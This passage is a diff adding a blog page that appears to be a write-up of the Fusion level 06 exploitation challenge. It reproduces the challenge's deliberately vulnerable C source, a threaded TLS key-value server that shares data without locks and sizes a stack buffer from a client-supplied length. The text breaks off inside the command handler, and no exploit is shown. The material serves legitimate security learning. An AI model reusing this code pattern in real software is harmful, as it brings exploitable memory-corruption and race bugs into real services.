@@ -1,0 +1,893 @@
+<!DOCTYPE html>
+<html class="default_colors_property">
+  <base href="/home/tabacco/tech/coding/web/execius.github.io/" target="">
+  <head>
+    <link rel="stylesheet" href="rsc/css/post.css">
+    <link rel="stylesheet" href="rsc/css/code.css">
+    <meta name="description" content="Multithreaded stack overrun, information leaks, and other lessons on why you should lock shared data">
+    <title>Execius : Fusion level 06 - Multithreaded fun</title>
+          
+    <link rel="stylesheet" href="rsc/css/mainstyle.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+    <meta charset="UTF-8">
+    <meta name="keywords" content="binary exploitation, hacking, pwn, reverse engineering , Execius">
+    <meta name="author" content="Execius">
+
+
+  </head>
+
+  <body>
+          
+    <nav class="bar navbar">
+
+      <div class="home_logo bar_item">
+        <a class="button logo_text"  href="index.html" >Execius</a>
+      </div>
+
+      <div class="categories bar_item">
+        <a class="button" href="./rsc/html/topics/index.html"><i class="fa-solid fa-folder"></i>Topics</a>
+        <a class="button" href="rsc/html/feed/index.html"><i class="fa-solid fa-square-rss"></i>Feed</a>
+        <a class="button" href="rsc/html/resources/index.html"><i class="fa-solid fa-book"></i> resources </a>
+      </div>
+
+    </nav>
+
+
+    <div class="layout">
+      <main class="content">
+
+        <div class="post">
+          <ul>
+<li>edit : after nearly two months of hiatus I'm back to this with  a new pair of eyes , I trust I will solve it this time , learn more about the inctricacies of multithreaded programs and move on to other challenges , so let's go!. </li>
+</ul>
+<h2>source code</h2>
+<div class="codehilite"><pre><span></span><code><span class="cp">#define THREADED</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&quot;../common/common.c&quot;</span>
+
+<span class="c1">// Taken some code from gnu tls documentation, </span>
+<span class="c1">// This example is a very simple echo server which supports X.509</span>
+<span class="c1">// authentication, using the RSA ciphersuites. </span>
+<span class="c1">// This file has the leading comment of... /* This example code is</span>
+<span class="c1">// placed in the public domain. */</span>
+<span class="c1">// so there :&gt;</span>
+
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;gcrypt.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;gnutls/gnutls.h&gt;</span>
+
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;libHX/init.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;libHX/defs.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;libHX/map.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;libHX/string.h&gt;</span>
+
+<span class="cp">#define KEYFILE &quot;/opt/fusion/ssl/key.pem&quot;</span>
+<span class="cp">#define CERTFILE &quot;/opt/fusion/ssl/cert.pem&quot;</span>
+<span class="cp">#define CAFILE &quot;/opt/fusion/ssl/ca.pem&quot;</span>
+<span class="cp">#define CRLFILE &quot;/opt/fusion/ssl/crl.pem&quot;</span>
+
+<span class="n">gnutls_certificate_credentials_t</span><span class="w"> </span><span class="n">x509_cred</span><span class="p">;</span>
+<span class="n">gnutls_priority_t</span><span class="w"> </span><span class="n">priority_cache</span><span class="p">;</span>
+
+<span class="k">static</span><span class="w"> </span><span class="n">gnutls_session_t</span>
+<span class="nf">initialize_tls_session</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="n">gnutls_session_t</span><span class="w"> </span><span class="n">session</span><span class="p">;</span>
+
+<span class="w">  </span><span class="n">gnutls_init</span><span class="w"> </span><span class="p">(</span><span class="o">&amp;</span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">GNUTLS_SERVER</span><span class="p">);</span>
+
+<span class="w">  </span><span class="n">gnutls_priority_set</span><span class="w"> </span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">priority_cache</span><span class="p">);</span>
+
+<span class="w">  </span><span class="n">gnutls_credentials_set</span><span class="w"> </span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">GNUTLS_CRD_CERTIFICATE</span><span class="p">,</span><span class="w"> </span><span class="n">x509_cred</span><span class="p">);</span>
+
+<span class="w">  </span><span class="cm">/* </span>
+<span class="cm">   *request client certificate if any.</span>
+<span class="cm">   */</span>
+<span class="w">  </span><span class="n">gnutls_certificate_server_set_request</span><span class="w"> </span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">GNUTLS_CERT_REQUEST</span><span class="p">);</span>
+
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">session</span><span class="p">;</span>
+<span class="p">}</span>
+
+
+<span class="k">struct</span><span class="w"> </span><span class="nc">HXmap</span><span class="w"> </span><span class="o">*</span><span class="n">dict</span><span class="p">;</span>
+
+<span class="k">struct</span><span class="w"> </span><span class="nc">data</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">data</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">size_t</span><span class="w"> </span><span class="n">length</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="k">struct</span><span class="w"> </span><span class="nc">data</span><span class="w"> </span><span class="o">*</span><span class="n">gather_data</span><span class="p">(</span><span class="n">gnutls_session_t</span><span class="w"> </span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">length</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="n">length</span><span class="p">];</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">offset</span><span class="p">,</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span>
+<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">data</span><span class="w"> </span><span class="o">*</span><span class="n">data</span><span class="p">;</span>
+
+<span class="w">  </span><span class="k">for</span><span class="p">(</span><span class="n">offset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">offset</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">length</span><span class="p">;</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">gnutls_record_recv</span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">buffer</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">offset</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span>
+<span class="w">      </span><span class="n">offset</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">65535</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="mi">65535</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="p">(</span><span class="n">length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">offset</span><span class="p">));</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">ret</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="w">    </span><span class="n">offset</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">data</span><span class="p">));</span>
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="w"> </span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="w">  </span><span class="n">data</span><span class="o">-&gt;</span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HX_memdup</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="n">length</span><span class="p">);</span>
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">data</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="n">data</span><span class="o">-&gt;</span><span class="n">length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">length</span><span class="p">;</span>
+
+<span class="w">  </span><span class="c1">//printf(&quot;gather data: returning %08x, data-&gt;length = %d\n&quot;, data, </span>
+<span class="w">  </span><span class="c1">// data-&gt;length);</span>
+<span class="w">  </span><span class="c1">//fflush(stdout);</span>
+
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">data</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="cp">#define NOKEY &quot;</span><span class="c1">// No key was specified\n&quot;</span>
+<span class="cp">#define NOTFOUND &quot;</span><span class="c1">// Key was not found\n&quot;</span>
+<span class="cp">#define KEYFOUND &quot;</span><span class="c1">// Key exists\n&quot;</span>
+<span class="cp">#define NOMEM &quot;</span><span class="c1">// Not enough memory to allocate\n&quot;</span>
+<span class="cp">#define UPDATEOK &quot;</span><span class="c1">// Updated successfully\n&quot;</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="n">update_data</span><span class="p">(</span><span class="n">gnutls_session_t</span><span class="w"> </span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">length</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">data</span><span class="w"> </span><span class="o">*</span><span class="n">data</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">size_t</span><span class="w"> </span><span class="n">offset</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span>
+
+<span class="w">  </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HXmap_get</span><span class="p">(</span><span class="n">dict</span><span class="p">,</span><span class="w"> </span><span class="n">key</span><span class="p">);</span>
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="w"> </span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">gnutls_record_send</span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">NOTFOUND</span><span class="p">,</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">NOTFOUND</span><span class="p">));</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">data</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">tmp</span><span class="p">;</span>
+<span class="w">    </span><span class="n">tmp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">realloc</span><span class="p">(</span><span class="n">data</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="n">length</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="w"> </span><span class="n">tmp</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">gnutls_record_send</span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">NOMEM</span><span class="p">,</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">NOMEM</span><span class="p">));</span>
+<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="n">data</span><span class="o">-&gt;</span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tmp</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span><span class="w">  </span>
+
+<span class="w">  </span><span class="k">for</span><span class="p">(</span><span class="n">offset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">offset</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">length</span><span class="p">;</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">gnutls_record_recv</span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">data</span><span class="o">-&gt;</span><span class="n">data</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">offset</span><span class="p">,</span><span class="w"> </span>
+<span class="w">      </span><span class="p">(</span><span class="n">length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">offset</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">65535</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="mi">65535</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="p">(</span><span class="n">length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">offset</span><span class="p">));</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">ret</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">    </span><span class="n">offset</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="n">gnutls_record_send</span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">UPDATEOK</span><span class="p">,</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">UPDATEOK</span><span class="p">));</span>
+
+<span class="w">  </span><span class="n">data</span><span class="o">-&gt;</span><span class="n">length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">length</span><span class="p">;</span>
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="n">send_data</span><span class="p">(</span><span class="n">gnutls_session_t</span><span class="w"> </span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">data</span><span class="w"> </span><span class="o">*</span><span class="n">data</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">offset</span><span class="p">,</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">to_send</span><span class="p">;</span>
+
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">msg</span><span class="p">;</span>
+
+<span class="w">  </span><span class="n">asprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">msg</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;// Sending %d bytes</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">data</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">);</span>
+<span class="w">  </span><span class="n">gnutls_record_send</span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">msg</span><span class="p">,</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">msg</span><span class="p">));</span>
+<span class="w">  </span><span class="n">free</span><span class="p">(</span><span class="n">msg</span><span class="p">);</span>
+
+<span class="w">  </span><span class="k">for</span><span class="p">(</span><span class="n">offset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">offset</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">data</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">;</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">tosend</span><span class="p">;</span>
+<span class="w">    </span><span class="n">tosend</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">data</span><span class="o">-&gt;</span><span class="n">length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">offset</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">65535</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="mi">65535</span><span class="w"> </span><span class="o">:</span><span class="w"> </span>
+<span class="w">      </span><span class="p">(</span><span class="n">data</span><span class="o">-&gt;</span><span class="n">length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">offset</span><span class="p">);</span>
+<span class="w">    </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">gnutls_record_send</span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">data</span><span class="o">-&gt;</span><span class="n">data</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">offset</span><span class="p">,</span>
+<span class="w">       </span><span class="n">tosend</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">ret</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
+<span class="w">    </span><span class="n">offset</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">free_data</span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">ptr</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">data</span><span class="w"> </span><span class="o">*</span><span class="n">data</span><span class="p">;</span>
+<span class="w">  </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">data</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">ptr</span><span class="p">);</span>
+
+<span class="w">  </span><span class="c1">//printf(&quot;in free data, got %08x\n&quot;, (unsigned int)data);</span>
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">data</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">free</span><span class="p">(</span><span class="n">data</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">void</span><span class="w"> </span><span class="n">new_dict</span><span class="p">()</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">HXmap_ops</span><span class="w"> </span><span class="n">mops</span><span class="p">;</span>
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">dict</span><span class="p">)</span><span class="w"> </span><span class="n">HXmap_free</span><span class="p">(</span><span class="n">dict</span><span class="p">);</span>
+
+<span class="w">  </span><span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mops</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">mops</span><span class="p">));</span>
+<span class="w">  </span><span class="n">mops</span><span class="p">.</span><span class="n">d_free</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">free_data</span><span class="p">;</span>
+
+<span class="w">  </span><span class="n">dict</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HXmap_init5</span><span class="p">(</span><span class="n">HXMAPT_HASH</span><span class="p">,</span><span class="w"> </span><span class="n">HXMAP_SKEY</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">HXMAP_CKEY</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">mops</span><span class="p">,</span><span class="w"> </span>
+<span class="w">    </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">data</span><span class="p">));</span>
+<span class="p">}</span>
+
+
+<span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">keyval_thread</span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">arg</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">arg</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span>
+<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">data</span><span class="w"> </span><span class="o">*</span><span class="n">data</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">cont</span><span class="p">;</span>
+
+<span class="w">  </span><span class="n">gnutls_session_t</span><span class="w"> </span><span class="n">session</span><span class="p">;</span>
+<span class="w">  </span><span class="n">session</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">initialize_tls_session</span><span class="w"> </span><span class="p">();</span>
+
+<span class="w">  </span><span class="n">gnutls_transport_set_ptr</span><span class="w"> </span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">gnutls_transport_ptr_t</span><span class="p">)</span><span class="w"> </span><span class="n">fd</span><span class="p">);</span>
+<span class="w">  </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">gnutls_handshake</span><span class="w"> </span><span class="p">(</span><span class="n">session</span><span class="p">);</span>
+
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">ret</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">msg</span><span class="p">;</span>
+
+<span class="w">    </span><span class="n">close</span><span class="w"> </span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+<span class="w">    </span><span class="n">gnutls_deinit</span><span class="w"> </span><span class="p">(</span><span class="n">session</span><span class="p">);</span>
+
+<span class="w">    </span><span class="n">msg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="w">    </span><span class="n">asprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">msg</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;*** Handshake has failed (%s)</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span>
+<span class="w">      </span><span class="n">gnutls_strerror</span><span class="p">(</span><span class="n">ret</span><span class="p">));</span>
+<span class="w">    </span><span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">msg</span><span class="p">,</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">msg</span><span class="p">));</span>
+<span class="w">    </span><span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+<span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">msg</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+
+<span class="cp">#define BANNER &quot;</span><span class="c1">// Welcome to KeyValDaemon. Type &#39;h&#39; for help information\n&quot;</span>
+<span class="w">  </span><span class="n">gnutls_record_send</span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">BANNER</span><span class="p">,</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">BANNER</span><span class="p">));</span>
+
+<span class="w">  </span><span class="n">cont</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="w">  </span><span class="k">while</span><span class="p">(</span><span class="n">cont</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">cmdbuf</span><span class="p">[</span><span class="mi">512</span><span class="p">],</span><span class="w"> </span><span class="o">*</span><span class="n">p</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">args</span><span class="p">[</span><span class="mi">6</span><span class="p">],</span><span class="w"> </span><span class="o">*</span><span class="n">msg</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">argcnt</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
+
+<span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="n">cmdbuf</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">cmdbuf</span><span class="p">));</span>
+<span class="w">    </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">gnutls_record_recv</span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">cmdbuf</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">cmdbuf</span><span class="p">));</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">ret</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="k">break</span><span class="p">;</span>
+
+<span class="w">    </span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strchr</span><span class="p">(</span><span class="n">cmdbuf</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;\r&#39;</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">p</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">    </span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strchr</span><span class="p">(</span><span class="n">cmdbuf</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;\n&#39;</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">p</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+
+<span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="n">args</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">args</span><span class="p">));</span>
+<span class="w">    </span><span class="n">argcnt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HX_split5</span><span class="p">(</span><span class="n">cmdbuf</span><span class="p">,</span><span class="w"> </span><span class="s">&quot; &quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">6</span><span class="p">,</span><span class="w"> </span><span class="n">args</span><span class="p">);</span>
+
+<span class="cp">#if 0</span>
+<span class="c">    for(i = 0; i &lt; argcnt; i++) {</span>
+<span class="c">      asprintf(&amp;msg, &quot;args[%d] = \&quot;%s\&quot;\n&quot;, i, args[i]);</span>
+<span class="c">      gnutls_record_send(session, msg, strlen(msg));</span>
+<span class="c">      free(msg);</span>
+<span class="c">    }</span>
+<span class="cp">#endif</span>
+
+
+
+<span class="w">    </span><span class="k">switch</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">])</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="k">case</span><span class="w"> </span><span class="sc">&#39;h&#39;</span><span class="p">:</span><span class="w"> </span>
+<span class="cp">#define HELP \</span>
